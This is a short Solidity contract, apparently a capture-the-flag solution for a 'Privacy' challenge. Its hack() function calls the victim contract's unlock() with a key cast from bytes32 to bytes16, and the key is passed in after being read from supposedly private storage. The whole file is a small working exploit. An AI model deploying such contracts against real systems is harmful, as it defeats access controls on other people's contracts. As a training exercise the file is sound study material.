// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Privacy {
    function unlock(bytes16 _key) external;
}

contract PrivacyBreaker {
  bytes32 public data;
  address public victim;

  constructor(bytes32 _data, address _victim) {
    data = _data;
    victim = _victim;
  }
  
  function hack() public {
    Privacy(victim).unlock(bytes16(data));
  }

}
